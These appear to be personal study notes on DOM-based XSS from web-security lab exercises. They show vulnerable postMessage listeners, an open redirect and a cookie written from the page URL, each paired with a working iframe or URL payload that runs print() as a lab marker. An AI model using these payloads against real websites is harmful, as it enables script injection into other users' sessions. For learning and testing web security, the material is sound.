DOM XSS using web messages through iframe and more

Code in the backend
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>

try to exploit it through this i frame, the second argument '*' indicates the allow target origin
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">

or
<style>
   iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 1;
        z-index: 2;
    }
</style>
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('<img src= 1 onerror=print()','*')">

if you find a code with a redirection

<script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>
                    
You can still exploit it inserting javascript in an URL, the only important thing is that you need to insert http or https protocol, due to the indexOf() function

as follow:
 <iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">


Sometimes tyou can face this type of vulnerabilities, in which there is the JSON.parse to exploit

      window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                        
Example to:
Remember the escape character "\"

<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
                            
Sometimes you can face a redirection vulnerabilities


                        <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>

To exxploit it you can modified the link as follow 

https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/


Another vulnerabilities could be related with the cookie

<script>
                            document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
                        </script>
                       
Possible payload to exploit it

<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">

quote:
"The original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute."
                        
                        